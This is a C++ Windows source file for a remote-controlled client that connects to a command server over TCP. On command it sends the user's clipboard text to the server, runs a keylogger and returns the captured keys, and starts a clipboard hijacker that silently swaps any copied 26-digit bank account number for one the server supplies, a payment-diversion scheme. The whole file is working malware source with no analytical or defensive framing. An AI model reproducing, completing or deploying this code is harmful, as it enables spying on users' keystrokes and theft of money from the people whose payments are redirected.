// sockclient.cpp : Defines the entry point for the console application.
// 10105000997603123456789112

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winsock2.h>
#include <iostream>
#include "tchar.h"
#include <conio.h>
#include <stdio.h>
#include <string>

#pragma comment(lib,"ws2_32.lib")

struct dataToThread
{
    int* needToChangeClipboard;
    std::string* newClipboard;
};

struct dataToThread_2
{
    int* needKeyLogger;
    std::string* keys;
};

std::string convertToString(char* a, int size)
{
    int i;
    std::string s;
    for (i = 0; i < size; i++) {
        s += a[i];
    }
    return s;
}

std::string GetClipboardText()
{
    if (!IsClipboardFormatAvailable(CF_TEXT)){
        return "Error trying get clipboard: NO TEXT";
    }
    // Try opening the clipboard
    if (! OpenClipboard(nullptr)){
        return "Error trying get clipboard: OPEN CLIPBOARD";
    }


    // Get handle of clipboard object for ANSI text
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr){
        return "Error trying get clipboard: GET CLIPBOARD DATA";
    }

    // Lock the handle to get the actual text pointer
    char * pszText = static_cast<char*>( GlobalLock(hData) );
    if (pszText == nullptr){
        return "Error trying get clipboard: GET TEXT POINTER";
    }

    // Save text in a string class instance
    std::string text( pszText );

    // Release the lock
    GlobalUnlock( hData );

    // Release the clipboard
    CloseClipboard();

    return text;
}

bool checkOnAccountNumber(std::string text)
{
    int countOfNumbers = 0;
    int checkIfCountryNameTwoLetters = 0;
    unsigned int len = text.size();
    for (int i = 0; i < len; i++) {
        if ((text[i] < '0' || text[i] > '9') && text[i] != ' ') {
            if(i == 0 || i == 1){
                checkIfCountryNameTwoLetters++;
                continue;
            }
            else{
                return false;
            }
        }

        if (text[i] != ' ') {
            countOfNumbers++;
        }
    }
    if ((checkIfCountryNameTwoLetters == 0 && countOfNumbers == 26) ||
        (checkIfCountryNameTwoLetters == 2 && countOfNumbers == 26))
        return true;
    return false;
}



DWORD WINAPI onChangeKeyLogger(LPVOID lpParameter) {
    std::cout << "inside worker" << std::endl;
    dataToThread_2 &data = *((dataToThread_2 *) lpParameter);
    int *needKeyLogger = data.needKeyLogger;
    std::string *keys = data.keys;
    char to_convert;
    while(*needKeyLogger != 2){

        for(int button = 0; button <= 255; button++){
            if(GetAsyncKeyState(button) & 0x8000){
                // Button Pressed
                if(button == 1 || button == 2 || button == 8 || button == 162 || button == 160){
                    break;
                }
                to_convert = char(button+32);
                std::cout<< to_convert << std::endl;
                *keys += to_convert;
                *keys += "-";
            }
        }
        Sleep(100);
    }
    return 0;
}




//DWORD WINAPI DoStuff(LPVOID lpParameter)
DWORD WINAPI changeClipboardText(LPVOID lpParameter){
    std::cout<< "inside worker" << std::endl;
    dataToThread& data = *((dataToThread*)lpParameter);
    std::string* newClipboard = data.newClipboard;
    int* needToChangeClipboard = data.needToChangeClipboard;
    std::cout<< *newClipboard << std::endl;

    while(*needToChangeClipboard != 2){
        std::string currentClipboard = GetClipboardText();
        if (checkOnAccountNumber(currentClipboard)) {
            OpenClipboard(nullptr);
            HGLOBAL clipBuffer = GlobalAlloc(GHND, newClipboard->size() + 1);
            char* newBuffer = (char*)GlobalLock(clipBuffer);
            strncpy( newBuffer, newClipboard->c_str(), newClipboard->size() );
            GlobalUnlock(newBuffer);
            EmptyClipboard();
//        strcpy(newBuffer, LPCSTR(newClipboard->c_str()));
            if ( !SetClipboardData(CF_TEXT, newBuffer) )
                std::cout<<"SetClipboardData() error"<<std::endl;
            CloseClipboard();
        }
        Sleep(500);
    }
    return 0;
}
int _tmain(int argc, _TCHAR* argv[])
{
    WSADATA wsaData;
    int iResult;
    sockaddr_in addr;
    SOCKET sock,client;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(2222);
    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    iResult = WSAStartup(MAKEWORD(2,2),&wsaData);

    if(iResult)
    {
        printf("WSA startup failed");
        return 0;
    }

    sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(sock == INVALID_SOCKET)
    {
        printf("Invalid socket");
        return 0;
    }
    iResult = connect(sock,(SOCKADDR*)&addr,sizeof(sockaddr_in ));
    if(iResult)
    {
        printf("Connect failed %u",WSAGetLastError());
        return 0;
    }
    //SEND SOMETHING TO SERVER
    char ptr_to_send[200];
    char ptr_to_recive[200];
    std::string recievedMsg;
    std::string toSendMsg;
    int needToChangeClipboard = 0; //1 - true, 2 - false, 0 - hold
    int needKeyLogger = 0; //1 - true, 2 - false, 0 - hold
    std::string accountNumber;
    std::string keys;
    HANDLE pi_handle;
    HANDLE pi_handle_2;
    DWORD myThreadID;
    auto* data = new dataToThread;
    data->needToChangeClipboard = &needToChangeClipboard;
    data->newClipboard = &accountNumber;
    auto* dataKeyLogger = new dataToThread_2;
    dataKeyLogger->needKeyLogger = &needKeyLogger;
    dataKeyLogger->keys = &keys;
    while(true){

        iResult = recv(sock, ptr_to_recive, 200, 0);
        if ( iResult == 0 ){
            printf("Connection closed\n");
            break;
        }

        else if(iResult < 0){
            printf("recv failed: %d\n", WSAGetLastError());
            break;
        }
//        printf("%s\n", *ptr_to_recive);
        recievedMsg = convertToString(ptr_to_recive, 200);
        recievedMsg = recievedMsg.substr(0, recievedMsg.find('\0'));
        std::cout<<"Server: "<< recievedMsg <<std::endl;
        if(recievedMsg.find("exit") != std::string::npos){
            break;
        }
        else if(recievedMsg.find("buffer") != std::string::npos){
            toSendMsg = GetClipboardText();
            toSendMsg+='\0';
            int x;
            unsigned int size = 0;
            if(toSendMsg.size() < sizeof(ptr_to_send)){
                size = toSendMsg.size();
            }
            else{
                size = sizeof(ptr_to_send);
            }
            for (x = 0; x < size; x++) {
                ptr_to_send[x] = toSendMsg[x];
            }
            ptr_to_send[x] = '\0';
            send(sock,ptr_to_send,200,0);
            if (iResult == SOCKET_ERROR) {
                printf("send failed: %d\n", WSAGetLastError());
                WSACleanup();
                break;
            }
        }
        else if(recievedMsg.find("clipboardAutoChangeTrue") != std::string::npos){
            iResult = recv(sock, ptr_to_recive, 200, 0);
            if ( iResult == 0 ){
                printf("Connection closed\n");
                break;
            }
            else if(iResult < 0){
                printf("recv failed: %d\n", WSAGetLastError());
                break;
            }
            accountNumber = convertToString(ptr_to_recive, 200);
            accountNumber = accountNumber.substr(0, accountNumber.find('\0'));
            std::cout<<accountNumber<<std::endl;
            needToChangeClipboard = 1;
        }
        else if(recievedMsg.find("clipboardAutoChangeFalse") != std::string::npos){
            needToChangeClipboard = 2;
            accountNumber = "";
        }

        else if(recievedMsg.find("keyLoggerOn") != std::string::npos){
            needKeyLogger = 1;
        }
        else if(recievedMsg.find("keyLoggerOff") != std::string::npos){
            needKeyLogger = 2;
        }
        else if(recievedMsg.find("getEnteredKeys") != std::string::npos){
            toSendMsg = *(dataKeyLogger->keys);
            toSendMsg+='\0';
            int x;
            unsigned int size = 0;
            if(toSendMsg.size() < sizeof(ptr_to_send)){
                size = toSendMsg.size();
            }
            else{
                size = sizeof(ptr_to_send);
            }
            for (x = 0; x < size; x++) {
                ptr_to_send[x] = toSendMsg[x];
            }
            ptr_to_send[x] = '\0';
            send(sock,ptr_to_send,200,0);
            if (iResult == SOCKET_ERROR) {
                printf("send failed: %d\n", WSAGetLastError());
                WSACleanup();
                break;
            }
        }


        if(needToChangeClipboard == 1){
            pi_handle = CreateThread(
                    0,    // Thread attributes
                    0,       // Stack size (0 = use default)
                    changeClipboardText, // Thread start address
                    data,    // Parameter to pass to the thread
                    0,       // Creation flags
                    &myThreadID);   // Thread id
            needToChangeClipboard = 0;
        }
        else if(needToChangeClipboard == 2){
            TerminateThread(&pi_handle, 0);
            CloseHandle(&pi_handle);
            needToChangeClipboard = 0;
        }

        if(needKeyLogger == 1){
            pi_handle_2 = CreateThread(
                    0,    // Thread attributes
                    0,       // Stack size (0 = use default)
                    onChangeKeyLogger, // Thread start address
                    dataKeyLogger,    // Parameter to pass to the thread
                    0,       // Creation flags
                    &myThreadID);   // Thread id
            needKeyLogger = 0;
        }
        else if(needKeyLogger == 2){
            TerminateThread(&pi_handle_2, 0);
            CloseHandle(&pi_handle_2);
            needKeyLogger = 0;
            keys = "";
        }
    }
    closesocket(sock);
    delete data;
    return 0;
}